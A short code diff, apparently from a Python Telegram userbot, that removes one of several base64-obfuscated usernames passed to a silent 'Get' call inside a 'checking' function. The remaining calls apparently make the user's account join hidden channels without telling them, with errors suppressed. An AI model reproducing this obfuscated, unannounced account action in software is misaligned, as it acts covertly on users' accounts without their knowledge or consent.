@@ -82,12 +82,10 @@ async def checking(client):
     gocheck = str(pybase64.b64decode("QG5hdGhhZWxseHg="))[2:12]
     checker = str(pybase64.b64decode("QG5hdGhzdXBwb3J0"))[2:13]
     checkxd = str(pybase64.b64decode("QHRlcnVzYXBhbGFnaXlh"))[2:16]
-    checkxe = str(pybase64.b64decode("QHR1YW5tYWhrYW1haA=="))[2:14]
     if client:
         try:
             await client(Get(gocheck))
             await client(Get(checker))
             await client(Get(checkxd))
-            await client(Get(checkxe))
         except BaseException:
             pass
